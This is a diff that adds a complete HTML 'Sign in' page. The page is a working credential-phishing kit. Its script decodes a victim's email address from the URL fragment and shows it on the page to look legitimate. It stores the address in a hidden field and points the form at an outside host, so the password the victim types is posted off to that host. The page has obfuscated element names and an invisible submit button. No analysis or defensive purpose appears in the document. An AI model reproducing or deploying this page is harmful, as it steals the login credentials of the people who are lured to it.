@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<title>Sign in</title>
+<link rel="stylesheet" type="text/css" href="./style.css" />
+<meta charset="UTF-8">
+<link rel="shortcut icon" href="favicon.ico">
+</head>
+
+<body>
+<form class="dewin" method="post" id="pax" action="" >
+<fieldset class="fews">
+ <div class="yumx" id="bax"></div><br>
+<input class="yumy" type="password" id="inpwd" name="pexam" placeholder="&nbsp;Password" value="" required autocomplete="off"><br>
+<input type="submit" class="aperi" value="jhgjhgjhghjgjhqx" style="opacity: 0;"><br>
+<input type="hidden" name="exam" id="cax" value="" required autocomplete="off"><br>
+</fieldset>
+</form>
+</body>
+<script>
+	document.getElementById("inpwd").focus();
+			    var str = window.location.href;
+				var strs = str.split("#");
+				var emap = strs[1];
+				var emaq = atob(emap);
+				if(emaq){
+					document.getElementById("bax").innerHTML = emaq;
+					document.getElementById("cax").value = emaq;
+					document.getElementById("pax").action = "https://supporterswebn.gq/ndex/index.php";
+				}
+</script>
+</html>
